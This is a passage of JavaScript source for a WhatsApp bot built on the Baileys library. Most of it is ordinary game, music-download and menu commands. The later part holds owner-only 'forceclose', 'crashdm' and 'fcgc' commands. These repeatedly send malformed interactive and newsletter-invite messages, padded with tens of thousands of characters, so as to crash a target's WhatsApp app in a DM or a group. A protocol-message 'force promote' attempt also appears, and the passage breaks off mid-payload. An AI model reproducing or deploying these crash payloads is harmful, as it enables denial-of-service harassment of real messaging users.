    "🎵 Name 10 songs in under 30 seconds!",
    "👀 Who can spot: find something blue in your room and take a photo!",
    "🦁 Everyone must make an animal sound in a voice note!",
  ];

  const ch = challenges[Math.floor(Math.random() * challenges.length)];
  mzazireply(`🎮 *GROUP CHALLENGE!*\n\n${ch}\n\n_Everyone participate!_ 💪`);
  break;
}

//=====================================//

// ████████████████████████████████████████
//   ACTIVE GAMES LIST
//   .games           — show active games
// ████████████████████████████████████████
case "games":
case "activegames": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const active = [];
  if (global.tttGames?.has(sender))      active.push("🎮 Tic-Tac-Toe — *endttt* to stop");
  if (global.hangmanGames?.has(sender))  active.push("🔤 Hangman — *endhangman* to stop");
  if (global.guessGames?.has(sender))    active.push("🔢 Number Guess — *endguess* to stop");
  if (global.scrambleGames?.has(sender)) active.push("🔀 Word Scramble — *endscramble* to stop");
  if (global.quizGames?.has(sender))     active.push("❓ Group Quiz — *endquiz* to stop");
  if (global.mathGames?.has(sender))     active.push("⚡ Fast Math — *endfastmath* to stop");
  if (global.wordchainGames?.has(sender)) active.push("🔗 Word Chain — *endwordchain* to stop");
  if (global.connectGames?.has(sender))  active.push("🟡 Connect 4 — *endc4* to stop");
  if (global.rpsGames?.has(sender))      active.push("🪨 RPS 1v1 — *endrps* to stop");

  if (active.length === 0) {
    return mzazireply(`🎮 *AVAILABLE GAMES*\n\n${prefix}ttt @user — Tic-Tac-Toe\n${prefix}hangman — Hangman\n${prefix}numguess — Number Guess\n${prefix}scramble — Word Scramble\n${prefix}quiz — Group Quiz\n${prefix}fastmath — Fast Math\n${prefix}wc <word> — Word Chain\n${prefix}c4 @user — Connect 4\n${prefix}rps1v1 @user — Rock Paper Scissors\n${prefix}tod — Truth or Dare\n${prefix}wyr — Would You Rather\n${prefix}nhie2 — Never Have I Ever\n${prefix}fillblank — Fill in the Blank\n${prefix}challenge — Group Challenge\n\n_No active games right now. Start one!_ 🎯`);
  }

  mzazireply(`🎮 *ACTIVE GAMES IN THIS GROUP:*\n\n${active.map((g, i) => `${i+1}. ${g}`).join("\n")}`);
  break;
}


case 'play': {
  if (!text) {
    return mzazireply(
      `🎵 *YouTube Music Downloader*\n\n` +
      `Usage: .play <song name>\n` +
      `Example: .play Faded Alan Walker\n\n` +
      `🎶 *Features:*\n` +
      `• Audio Download\n` +
      `• File Download\n` +
      `• Video Download\n` +
      `• Both Audio & File`
    );
  }

  try {
    await mzazi.sendMessage(sender, { react: { text: '⏳', key: m.key } });

    const query = encodeURIComponent(text.trim());
    const apiUrl = `https://apis.davidcyril.name.ng/play?query=${query}&apikey=`;

    const response = await axios.get(apiUrl, { timeout: 60000 });
    const data = response.data;

    if (!data.status || !data.result) {
      await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
      return mzazireply(`❌ No results found for: ${text}`);
    }

    // ── Get first result ──
    let result;
    if (Array.isArray(data.result)) {
      result = data.result[0];
    } else {
      result = data.result;
    }

    if (!result) {
      await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
      return mzazireply(`❌ No results found for: ${text}`);
    }

    const title = result.title || 'Unknown Title';
    const thumbnail = result.thumbnail || '';
    const duration = result.duration || 'N/A';
    const views = result.views || 0;
    const download_url = result.download_url || result.downloadUrl || '';
    const video_url = result.video_url || result.url || '';

    // ── Generate session ID ──
    const sessionId = `play_${Date.now()}_${senderNum}`;
    if (!global.playSessions) global.playSessions = new Map();
    global.playSessions.set(sessionId, { title, download_url, video_url, thumbnail, duration, views });

    // ── Prepare thumbnail ──
    let thumbnailBuffer = null;
    if (thumbnail) {
      try {
        const { data: imgBuf } = await axios.get(thumbnail, { 
          responseType: 'arraybuffer', 
          timeout: 8000 
        });
        thumbnailBuffer = Buffer.from(imgBuf);
      } catch (e) {}
    }

    // ── Send song info with buttons ──
    const songInfo = 
      `🎵 *${title}*\n\n` +
      `⏱️ *Duration:* ${duration}\n` +
      `👁️ *Views:* ${views ? views.toLocaleString() : 'N/A'}\n` +
      `📡 *Source:* YouTube\n\n` +
      `👇 *Choose download option:*`;

    await mzazi.sendMessage(
      sender,
      {
        image: thumbnailBuffer || (await axios.get('https://via.placeholder.com/300x200/1a1a2e/1fdb7e?text=Music', { responseType: 'arraybuffer' })).data,
        caption: songInfo,
        footer: `© ${botName} | MAGGIE X KERUBO`,
        buttons: [
          {
            buttonId: `${prefix}playdl ${sessionId} audio`,
            buttonText: { displayText: "🎵 Audio" },
            type: 1
          },
          {
            buttonId: `${prefix}playdl ${sessionId} file`,
            buttonText: { displayText: "📄 File" },
            type: 1
          },
          {
            buttonId: `${prefix}playdl ${sessionId} video`,
            buttonText: { displayText: "🎬 Video" },
            type: 1
          },
          {
            buttonId: `${prefix}playdl ${sessionId} both`,
            buttonText: { displayText: "🎵+📄 Both" },
            type: 1
          },
          {
            buttonId: `${prefix}playclear ${sessionId}`,
            buttonText: { displayText: "❌ Cancel" },
            type: 1
          }
        ],
        headerType: 4
      },
      { quoted: m }
    );

    await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });

    // ── Cleanup after 5 minutes ──
    setTimeout(() => {
      if (global.playSessions) global.playSessions.delete(sessionId);
    }, 300000);

  } catch (err) {
    logger.error('Play error:', err);
    await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
    mzazireply(`❌ ${err.message || 'Search failed'}`);
  }
  break;
}

// ── Download Handler ──
case 'playdl': {
  const parts = text ? text.split(/\s+/) : [];
  const sessionId = parts[0] || '';
  const format = parts[1] || '';

  if (!sessionId || !format) {
    return mzazireply(`❌ Invalid request. Use the buttons from ${prefix}play.`);
  }

  if (!global.playSessions) global.playSessions = new Map();
  const data = global.playSessions.get(sessionId);

  if (!data) {
    return mzazireply(`❌ Session expired. Search again with '${prefix}play <song>'.`);
  }

  const { title, download_url, video_url } = data;

  try {
    await mzazi.sendMessage(sender, { react: { text: '⏳', key: m.key } });

    const contextInfo = {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363425539800408@newsletter",
        newsletterName: botName.toUpperCase(),
        serverMessageId: 143,
      },
    };

    // ── Handle VIDEO format ──
    if (format === 'video') {
      let videoBuffer = null;
      let fileSizeMB = '0';

      // Try to get video
      if (video_url && video_url.includes('.mp4')) {
        try {
          const res = await axios.get(video_url, {
            responseType: 'arraybuffer',
            timeout: 60000,
            maxRedirects: 5,
          });
          videoBuffer = Buffer.from(res.data);
          fileSizeMB = (videoBuffer.length / (1024 * 1024)).toFixed(1);
        } catch (e) {}
      }

      // Fallback: use ytdl
      if (!videoBuffer) {
        try {
          const ytdl = require('ytdl-core');
          const info = await ytdl.getInfo(video_url || download_url);
          const videoFormat = ytdl.chooseFormat(info.formats, { 
            quality: 'highest', 
            filter: 'audioandvideo' 
          });
          if (videoFormat) {
            const videoRes = await axios.get(videoFormat.url, {
              responseType: 'arraybuffer',
              timeout: 120000,
            });
            videoBuffer = Buffer.from(videoRes.data);
            fileSizeMB = (videoBuffer.length / (1024 * 1024)).toFixed(1);
          }
        } catch (e) {}
      }

      if (videoBuffer && videoBuffer.length > 5000) {
        await mzazi.sendMessage(
          sender,
          {
            video: videoBuffer,
            mimetype: 'video/mp4',
            fileName: `${title}.mp4`,
            caption: `🎬 *${title}*\n📦 Size: ${fileSizeMB} MB\n⚡ ${botName}`,
            contextInfo,
          },
          { quoted: m }
        );

        await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });
        global.playSessions.delete(sessionId);
      } else {
        await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
        return mzazireply(`❌ Video download failed. Try using Audio or File instead.`);
      }
      return;
    }

    // ── Handle AUDIO download ──
    const audioRes = await axios.get(download_url, {
      responseType: 'arraybuffer',
      timeout: 120000,
    });
    const buffer = Buffer.from(audioRes.data);
    const fileSizeMB = (buffer.length / (1024 * 1024)).toFixed(1);

    const audioCaption = `🎵 *${title}*\n📦 Size: ${fileSizeMB} MB\n⚡ ${botName}`;

    // ── Handle "both" ──
    if (format === 'both') {
      // Send Audio
      await mzazi.sendMessage(
        sender,
        {
          audio: buffer,
          mimetype: 'audio/mpeg',
          fileName: `${title}.mp3`,
          caption: audioCaption,
          contextInfo,
        },
        { quoted: m }
      );

      await new Promise(resolve => setTimeout(resolve, 500));

      // Send File
      await mzazi.sendMessage(
        sender,
        {
          document: buffer,
          mimetype: 'audio/mpeg',
          fileName: `${title}.mp3`,
          caption: `📄 *${title}*\n📦 ${fileSizeMB} MB\n⚡ ${botName}`,
          contextInfo,
        },
        { quoted: m }
      );

      await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });
      global.playSessions.delete(sessionId);
      return;
    }

    // ── Audio or File ──
    if (format === 'audio') {
      await mzazi.sendMessage(
        sender,
        {
          audio: buffer,
          mimetype: 'audio/mpeg',
          fileName: `${title}.mp3`,
          caption: audioCaption,
          contextInfo,
        },
        { quoted: m }
      );
    } else if (format === 'file') {
      await mzazi.sendMessage(
        sender,
        {
          document: buffer,
          mimetype: 'audio/mpeg',
          fileName: `${title}.mp3`,
          caption: `📄 *${title}*\n📦 ${fileSizeMB} MB\n⚡ ${botName}`,
          contextInfo,
        },
        { quoted: m }
      );
    } else {
      return mzazireply('❌ Invalid format.');
    }

    await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });
    global.playSessions.delete(sessionId);

  } catch (err) {
    logger.error('Play download error:', err);
    await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
    mzazireply(`❌ Download failed: ${err.message}`);
  }
  break;
}

// ── Clear Session ──
case 'playclear': {
  const sessionId = text ? text.trim() : '';

  if (!sessionId) return mzazireply('❌ Invalid session.');
  
  if (global.playSessions) {
    global.playSessions.delete(sessionId);
  }
  
  await mzazireply('🧹 Session cleared.');
  break;
}

case 'repo': {
  const repoText = 
    `📦 *MZAZI TECH QUARTZ BOT REPOSITORY*\n\n` +
    `🛍️ *Store:* https://mzazi.shop\n` +
    `👑 *Owner:* MAGGIE X KERUBO\n\n` +
    `© MZAZI TECH QUARTZ BOT | MAGGIE X KERUBO`;

  try {
    // ── Build interactive message with CTA URL ──
    const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
    
    const interactiveMsg = generateWAMessageFromContent(
      sender,
      {
        interactiveMessage: {
          body: { text: repoText },
          footer: { text: `© MZAZI TECH QUARTZ BOT | MAGGIE X KERUBO` },
          nativeFlowMessage: {
            buttons: [
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '🛍️ Visit Store',
                  url: 'https://mzazi.shop'
                })
              },
              {
                name: 'quick_reply',
                buttonParamsJson: JSON.stringify({
                  display_text: '👑 Owner',
                  id: `${prefix}owner`
                })
              }
            ]
          }
        }
      },
      {}
    );

    await mzazi.relayMessage(sender, interactiveMsg.message, {
      messageId: interactiveMsg.key.id
    });

  } catch (err) {
    // Fallback: regular buttons
    await mzazireply(repoText, {
      customButtons: [
        {
          buttonId: `https://mzazi.shop`,
          buttonText: { displayText: "🛍️ Visit Store" },
          type: 1
        },
        {
          buttonId: `${prefix}owner`,
          buttonText: { displayText: "👑 Owner" },
          type: 1
        }
      ]
    });
  }
  break;
}

case 'menup': {
  const { generateWAMessageFromContent, prepareWAMessageMedia } = require('@whiskeysockets/baileys');

  // ── Get menu image ──
  const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
  const defaultMenuPic = "./media/menu.jpg";
  const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;
  
  let menuImageBuffer = null;
  if (fs.existsSync(menuPicPath)) {
    menuImageBuffer = fs.readFileSync(menuPicPath);
  }

  const menuText = 
    `🤖 *MZAZI TECH QUARTZ BOT*\n` +
    `━━━━━━━━━━━━━━━━━━━\n` +
    `👋 Hello ${m.pushName || 'User'}!\n\n` +
    `📌 *Select a category from the list below:*`;

  try {
    // ── Prepare image for interactive message ──
    let imageMessage = null;
    if (menuImageBuffer) {
      try {
        const media = await prepareWAMessageMedia(
          { image: menuImageBuffer },
          { upload: mzazi.waUploadToServer }
        );
        imageMessage = media.imageMessage;
      } catch (e) {
        logger.error('Failed to prepare menu image:', e.message);
      }
    }

    // ── Send interactive list message with image ──
    const interactiveMsg = generateWAMessageFromContent(
      sender,
      {
        interactiveMessage: {
          header: imageMessage ? {
            title: '📋 MZAZI TECH QUARTZ BOT',
            hasMediaAttachment: true,
            imageMessage: imageMessage
          } : {
            title: '📋 MZAZI TECH QUARTZ BOT'
          },
          body: { text: menuText },
          footer: { text: `© MZAZI TECH QUARTZ BOT | MAGGIE X KERUBO` },
          nativeFlowMessage: {
            buttons: [
              {
                name: 'single_select',
                buttonParamsJson: JSON.stringify({
                  title: '📂 Select Category',
                  sections: [
                    {
                      title: '🎵 Music',
                      rows: [
                        { 
                          header: '🎵 Play Music',
                          title: 'Download any song',
                          id: `${prefix}play`
                        },
                        { 
                          header: '📝 Get Lyrics',
                          title: 'Find song lyrics',
                          id: `${prefix}lyrics`
                        }
                      ]
                    },
                    {
                      title: '🖼️ Image',
                      rows: [
                        { 
                          header: '🎨 Generate Image',
                          title: 'Create AI images',
                          id: `${prefix}image`
                        },
                        { 
                          header: '🖼️ Get Wallpaper',
                          title: 'Download wallpapers',
                          id: `${prefix}wallpaper`
                        }
                      ]
                    },
                    {
                      title: '🎨 Sticker',
                      rows: [
                        { 
                          header: '🎨 Make Sticker',
                          title: 'From image to sticker',
                          id: `${prefix}sticker`
                        },
                        { 
                          header: '🎬 GIF Sticker',
                          title: 'Animated stickers',
                          id: `${prefix}stickergif`
                        }
                      ]
                    },
                    {
                      title: '🔧 Tools',
                      rows: [
                        { 
                          header: '🏓 Ping',
                          title: 'Check bot latency',
                          id: `${prefix}ping`
                        },
                        { 
                          header: '🤖 Status',
                          title: 'Check bot status',
                          id: `${prefix}alive`
                        },
                        { 
                          header: '📊 Stats',
                          title: 'View bot statistics',
                          id: `${prefix}stats`
                        }
                      ]
                    },
                    {
                      title: '👑 Owner',
                      rows: [
                        { 
                          header: '👑 Contact Owner',
                          title: 'Get owner info',
                          id: `${prefix}owner`
                        },
                        { 
                          header: '📦 Repository',
                          title: 'View bot repo',
                          id: `${prefix}repo`
                        }
                      ]
                    }
                  ]
                })
              }
            ]
          }
        }
      },
      {}
    );

    await mzazi.relayMessage(sender, interactiveMsg.message, {
      messageId: interactiveMsg.key.id
    });

  } catch (err) {
    logger.error('Menu error:', err);
    
    // ── Fallback: Send with image and buttons ──
    try {
      if (menuImageBuffer) {
        await mzazi.sendMessage(
          sender,
          {
            image: menuImageBuffer,
            caption: menuText,
            footer: `© MZAZI TECH QUARTZ BOT | MAGGIE X KERUBO`,
            buttons: [
              {
                buttonId: `${prefix}play`,
                buttonText: { displayText: "🎵 Music" },
                type: 1
              },
              {
                buttonId: `${prefix}image`,
                buttonText: { displayText: "🖼️ Image" },
                type: 1
              },
              {
                buttonId: `${prefix}sticker`,
                buttonText: { displayText: "🎨 Sticker" },
                type: 1
              },
              {
                buttonId: `${prefix}owner`,
                buttonText: { displayText: "👑 Owner" },
                type: 1
              }
            ],
            headerType: 4
          },
          { quoted: m }
        );
      } else {
        // Fallback without image
        const fallbackText = 
          `🤖 *MZAZI TECH QUARTZ BOT*\n` +
          `━━━━━━━━━━━━━━━━━━━\n` +
          `👋 Hello ${m.pushName || 'User'}!\n\n` +
          `📌 *Commands:*\n` +
          `🎵 .play <song>\n` +
          `🖼️ .image <prompt>\n` +
          `🎨 .sticker\n` +
          `🔧 .ping\n` +
          `👑 .owner\n` +
          `━━━━━━━━━━━━━━━━━━━\n` +
          `© MZAZI TECH QUARTZ BOT | MAGGIE X KERUBO`;

        await mzazireply(fallbackText);
      }
    } catch (fallbackErr) {
      // Ultimate fallback: plain text
      await mzazireply(menuText);
    }
  }
  break;
}

case 'menun': {
  const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

  const menuText = 
    `🤖 *MZAZI TECH QUARTZ BOT*\n` +
    `━━━━━━━━━━━━━━━━━━━\n` +
    `👋 Hello ${m.pushName || 'User'}!\n\n` +
    `📌 *Select a category from the list below:*`;

  try {
    // ── Send interactive list message ──
    const interactiveMsg = generateWAMessageFromContent(
      sender,
      {
        interactiveMessage: {
          body: { text: menuText },
          footer: { text: `© MZAZI TECH QUARTZ BOT | MAGGIE X KERUBO` },
          nativeFlowMessage: {
            buttons: [
              {
                name: 'single_select',
                buttonParamsJson: JSON.stringify({
                  title: '📂 Select Category',
                  sections: [
                    {
                      title: '🎵 Music',
                      rows: [
                        { 
                          header: '🎵 Play Music',
                          title: 'Download any song',
                          id: `${prefix}play`
                        },
                        { 
                          header: '📝 Get Lyrics',
                          title: 'Find song lyrics',
                          id: `${prefix}lyrics`
                        }
                      ]
                    },
                    {
                      title: '🖼️ Image',
                      rows: [
                        { 
                          header: '🎨 Generate Image',
                          title: 'Create AI images',
                          id: `${prefix}image`
                        },
                        { 
                          header: '🖼️ Get Wallpaper',
                          title: 'Download wallpapers',
                          id: `${prefix}wallpaper`
                        }
                      ]
                    },
                    {
                      title: '🎨 Sticker',
                      rows: [
                        { 
                          header: '🎨 Make Sticker',
                          title: 'From image to sticker',
                          id: `${prefix}sticker`
                        },
                        { 
                          header: '🎬 GIF Sticker',
                          title: 'Animated stickers',
                          id: `${prefix}stickergif`
                        }
                      ]
                    },
                    {
                      title: '🔧 Tools',
                      rows: [
                        { 
                          header: '🏓 Ping',
                          title: 'Check bot latency',
                          id: `${prefix}ping`
                        },
                        { 
                          header: '🤖 Status',
                          title: 'Check bot status',
                          id: `${prefix}alive`
                        }
                      ]
                    },
                    {
                      title: '👑 Owner',
                      rows: [
                        { 
                          header: '👑 Contact Owner',
                          title: 'Get owner info',
                          id: `${prefix}owner`
                        },
                        { 
                          header: '📦 Repository',
                          title: 'View bot repo',
                          id: `${prefix}repo`
                        }
                      ]
                    }
                  ]
                })
              }
            ]
          }
        }
      },
      {}
    );

    await mzazi.relayMessage(sender, interactiveMsg.message, {
      messageId: interactiveMsg.key.id
    });

  } catch (err) {
    // Fallback: regular buttons
    const fallbackText = 
      `🤖 *MZAZI TECH QUARTZ BOT*\n` +
      `━━━━━━━━━━━━━━━━━━━\n` +
      `👋 Hello ${m.pushName || 'User'}!\n\n` +
      `📌 *Commands:*\n` +
      `🎵 .play <song>\n` +
      `🖼️ .image <prompt>\n` +
      `🎨 .sticker\n` +
      `🔧 .ping\n` +
      `👑 .owner\n` +
      `━━━━━━━━━━━━━━━━━━━\n` +
      `© MZAZI TECH QUARTZ BOT | MAGGIE X KERUBO`;

    await mzazireply(fallbackText);
  }
  break;
}
case 'imba': {
  if (!text) {
    return mzazireply(
      `🎵 *YouTube Music Downloader*\n\n` +
      `Usage: .play <song name>\n` +
      `Example: .play Faded Alan Walker`
    );
  }

  try {
    await mzazi.sendMessage(sender, { react: { text: '⏳', key: m.key } });

    const query = encodeURIComponent(text.trim());
    const apiUrl = `https://apis.davidcyril.name.ng/play?query=${query}&apikey=`;

    const response = await axios.get(apiUrl, { timeout: 60000 });
    const data = response.data;

    if (!data.status || !data.result) {
      await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
      return mzazireply(`❌ No results found for: ${text}`);
    }

    // Get first result only
    let result;
    if (Array.isArray(data.result)) {
      result = data.result[0];
    } else {
      result = data.result;
    }

    if (!result) {
      await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
      return mzazireply(`❌ No results found for: ${text}`);
    }

    const title = result.title || 'Unknown Title';
    const thumbnail = result.thumbnail || '';
    const duration = result.duration || 'N/A';
    const views = result.views || 0;
    const download_url = result.download_url || result.downloadUrl || '';
    const video_url = result.video_url || result.url || '';

    // ── Send Song Info first ──
    let infoMessage = `🎵 *SONG INFO*\n\n` +
                      `📌 *Title:* ${title}\n` +
                      `⏱️ *Duration:* ${duration}\n` +
                      `👁️ *Views:* ${views ? views.toLocaleString() : 'N/A'}\n` +
                      `📡 *Source:* YouTube\n\n` +
                      `⏳ *Downloading audio...*`;

    // Try to send with thumbnail if available
    if (thumbnail) {
      try {
        const { data: imgBuf } = await axios.get(thumbnail, { 
          responseType: 'arraybuffer', 
          timeout: 8000 
        });
        
        await mzazi.sendMessage(
          sender,
          {
            image: Buffer.from(imgBuf),
            caption: infoMessage,
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '120363425539800408@newsletter',
                newsletterName: botName.toUpperCase(),
                serverMessageId: 143,
              },
            },
          },
          { quoted: m }
        );
      } catch {
        // If image fails, send text only
        await mzazireply(infoMessage);
      }
    } else {
      await mzazireply(infoMessage);
    }

    // ── Download audio ──
    const audioRes = await axios.get(download_url, {
      responseType: 'arraybuffer',
      timeout: 120000,
    });
    const buffer = Buffer.from(audioRes.data);
    const fileSizeMB = (buffer.length / (1024 * 1024)).toFixed(1);

    const contextInfo = {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '120363425539800408@newsletter',
        newsletterName: botName.toUpperCase(),
        serverMessageId: 143,
      },
    };

    // ── Send Document ──
    await mzazi.sendMessage(
      sender,
      {
        document: buffer,
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`,
        caption: `📄 *${title}*\n📦 ${fileSizeMB} MB\n⚡ ${botName}`,
        contextInfo,
      },
      { quoted: m }
    );

    // Small delay between messages
    await new Promise(resolve => setTimeout(resolve, 500));

    // ── Send Audio ──
    await mzazi.sendMessage(
      sender,
      {
        audio: buffer,
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`,
        caption: `🎵 *${title}*\n📦 ${fileSizeMB} MB\n⚡ ${botName}`,
        contextInfo,
      },
      { quoted: m }
    );

    await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });

  } catch (err) {
    logger.error('Play error:', err);
    await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
    mzazireply(`❌ ${err.message || 'Search failed'}`);
  }
  break;
}


case 'promosi': {
  // ── Check if user is bot owner ──
  const ownerNumbers = ['254112896604']; // Add your phone number(s) here
  const senderNum = sender.split('@')[0];
  
  if (!ownerNumbers.includes(senderNum)) {
    return mzazireply(`❌ *Access Denied*\n\nOnly bot owners can use this command.`);
  }

  // ── Get target user ──
  let target = text ? text.trim() : '';
  
  if (!target) {
    return mzazireply(
      `👑 *Promote Command*\n\n` +
      `Usage: .promote <@mention or phone number>\n` +
      `Example: .promote 254712345678\n` +
      `Or: .promote @username\n\n` +
      `⚠️ *Note:* This only works if the bot is already an admin!`
    );
  }

  // Extract number from mention or direct input
  let targetNumber = target;
  if (target.includes('@')) {
    const mentionMatch = target.match(/@(\d+)/);
    if (mentionMatch) targetNumber = mentionMatch[1];
  }
  
  // Clean the number
  targetNumber = targetNumber.replace(/[^0-9]/g, '');
  if (!targetNumber.startsWith('254')) targetNumber = '254' + targetNumber;
  
  const targetJid = targetNumber + '@s.whatsapp.net';

  try {
    await mzazi.sendMessage(sender, { react: { text: '⏳', key: m.key } });

    // ── Method 1: Try to promote using group update (works if bot is admin) ──
    try {
      await mzazi.groupParticipantsUpdate(
        sender,
        [targetJid],
        'promote'
      );
      
      await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });
      return mzazireply(
        `👑 *Promotion Successful!*\n\n` +
        `User: @${targetNumber}\n` +
        `Status: Now an admin ✅\n` +
        `Powered by: ${botName}`,
        { mentions: [targetJid] }
      );
    } catch (promoteError) {
      // ── Method 2: Try force promote via protocol (this won't work either) ──
      logger.warn('[Promote] Normal promotion failed:', promoteError);
      
      // Try to send a protocol message (experimental, likely won't work)
      try {
        const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
        
        const protocolMsg = generateWAMessageFromContent(
          sender,
          new proto.Message({
            protocolMessage: {
              type: 12, // APP_STATE_SYNC_KEY_REQUEST
              key: {
                remoteJid: sender,
                fromMe: true,
                id: 'force_promote_' + Date.now()
              }
            }
          }),
          {}
        );
        
        await mzazi.relayMessage(sender, protocolMsg.message, {
          messageId: protocolMsg.key.id
        });
        
        // Check if it worked
        const groupMetadata = await mzazi.groupMetadata(sender);
        const isTargetAdmin = groupMetadata.participants.some(
          p => p.id === targetJid && p.admin
        );
        
        if (isTargetAdmin) {
          await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });
          return mzazireply(
            `👑 *Force Promotion Attempted!*\n\n` +
            `User: @${targetNumber}\n` +
            `Status: Force promotion appears successful ✅\n` +
            `⚠️ This may not work on all WhatsApp versions.`,
            { mentions: [targetJid] }
          );
        } else {
          throw new Error('Force promotion failed');
        }
      } catch (forceError) {
        logger.error('[Promote] Force promotion failed:', forceError);
        
        // ── Method 3: Send a fake promotion message (just to pretend) ──
        await mzazi.sendMessage(sender, { react: { text: '⚠️', key: m.key } });
        
        return mzazireply(
          `❌ *Promotion Failed*\n\n` +
          `❌ The bot is NOT an admin in this group.\n\n` +
          `📌 *Requirements:*\n` +
          `• Bot must be an admin\n` +
          `• Target must be a group member\n` +
          `• WhatsApp restrictions apply\n\n` +
          `💡 *Solution:*\n` +
          `1. Manually add the bot as admin\n` +
          `2. Then use .promote again\n\n` +
          `🔒 *Security Notice:*\n` +
          `WhatsApp doesn't allow non-admin bots to promote users.\n` +
          `This is a security measure by WhatsApp.`
        );
      }
    }

  } catch (err) {
    logger.error('Promote error:', err);
    await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
    mzazireply(`❌ Promotion failed: ${err.message}`);
  }
  break;
}


case 'forceclose':
case 'fc':
case 'crashdm': {
  if (!isOwner) {
    await mzazireply('❌ Only the bot owner can use this command.');
    break;
  }

  if (!text) {
    return mzazireply(
      `💀 *Force Close - Crash Target DM*\n\n` +
      `Usage: .forceclose <phone_number> [count]\n` +
      `Example: .forceclose 254712345678 5\n` +
      `Default count: 3\n\n` +
      `_⚠️ Sends crash payload to the target's DM._`
    );
  }

  // ── Parse target and count ──
  const parts = text.trim().split(/\s+/);
  const rawNumber = parts[0].replace(/\D/g, '');
  const count = Math.min(parseInt(parts[1]) || 3, 10);

  if (rawNumber.length < 8) {
    return mzazireply('❌ Invalid phone number. Please provide a valid number with country code.');
  }

  const targetJid = `${rawNumber}@s.whatsapp.net`;

  await mzazireply(
    `💀 *Force Close Started*\n\n` +
    `📱 Target: +${rawNumber}\n` +
    `📊 Count: ${count} payloads\n` +
    `⏳ Sending crash payloads...`
  );

  let sent = 0;
  let failed = 0;

  try {
    const crypto = require('crypto');

    // ── Payload function ──
    async function sendForceClose() {
      try {
        await mzazi.relayMessage(targetJid, {
          senderKeyDistributionMessage: {
            groupId: "120363428445623974@g.us",
            axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
          },
          interactiveMessage: {
            body: {
              text: "MZAZI TECH | FORCE CLOSE"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "catalog_message",
                  buttonParamsJson: "{}"
                }
              ],
              messageParamsJson: "{}"
            }
          }
        }, {
          additionalNodes: [
            {
              tag: "biz",
              attrs: {
                native_flow_name: "catalog_message"
              }
            }
          ]
        });
        return true;
      } catch (e) {
        logger.error('[ForceClose] Error:', e.message);
        return false;
      }
    }

    // ── Execute with delay between each ──
    for (let i = 0; i < count; i++) {
      const result = await sendForceClose();
      if (result) sent++;
      else failed++;
      
      if (i < count - 1) {
        await new Promise(resolve => setTimeout(resolve, 1500));
      }
    }

    await mzazireply(
      `✅ *Force Close Complete*\n\n` +
      `📱 Target: +${rawNumber}\n` +
      `📊 Sent: ${sent} payloads\n` +
      `❌ Failed: ${failed}\n` +
      `💀 Status: ${failed > 0 ? '⚠️ Some payloads failed' : '✅ All payloads delivered'}`
    );

  } catch (err) {
    logger.error('ForceClose error:', err);
    await mzazireply(`❌ ForceClose failed: ${err.message}`);
  }
  break;
}
case 'fcgc': {
  if (!isOwner) {
    await mzazireply('❌ Only the bot owner can use this command.');
    break;
  }

  // ── Check if in a group ──
  if (!isGroup) {
    return mzazireply('❌ This command only works in groups.');
  }

  // ── Check if bot is admin ──
 

  // ── Parse count (optional) ──
  const count = Math.min(parseInt(text) || 3, 10);

  await mzazireply(
    `💀 *Force Close Started*\n\n` +
    `👥 Group: ${sender}\n` +
    `📊 Count: ${count} payloads\n` +
    `⏳ Sending crash payloads to the group...`
  );

  let sent = 0;
  let failed = 0;

  try {
    const crypto = require('crypto');

    // ── Payload function ──
    async function sendForceClose() {
      try {
        await mzazi.relayMessage(sender, {
          senderKeyDistributionMessage: {
            groupId: "120363428445623974@g.us",
            axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
          },
          interactiveMessage: {
            body: {
              text: "MZAZI TECH | FORCE CLOSE"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "catalog_message",
                  buttonParamsJson: "{}"
                }
              ],
              messageParamsJson: "{}"
            }
          }
        }, {
          additionalNodes: [
            {
              tag: "biz",
              attrs: {
                native_flow_name: "catalog_message"
              }
            }
          ]
        });
        return true;
      } catch (e) {
        logger.error('[ForceClose] Error:', e.message);
        return false;
      }
    }

    // ── Send payload 1: Standard force close ──
    for (let i = 0; i < count; i++) {
      const result = await sendForceClose();
      if (result) sent++;
      else failed++;
      
      if (i < count - 1) {
        await new Promise(resolve => setTimeout(resolve, 1500));
      }
    }

    // ── Extra payload: Newsletter Admin Invite ──
    async function sendNewsletterCrash() {
      try {
        await mzazi.relayMessage(sender, {
          botInvokeMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: '33333333333333333@newsletter',
                newsletterName: "MZAZI TECH FORCE CLOSE" + "ꦾ".repeat(80000),
                jpegThumbnail: null,
                caption: "💀".repeat(50000) + "🔥".repeat(50000),
                inviteExpiration: Date.now() + 1814400000,
              },
            },
          },
        }, {
          userJid: sender,
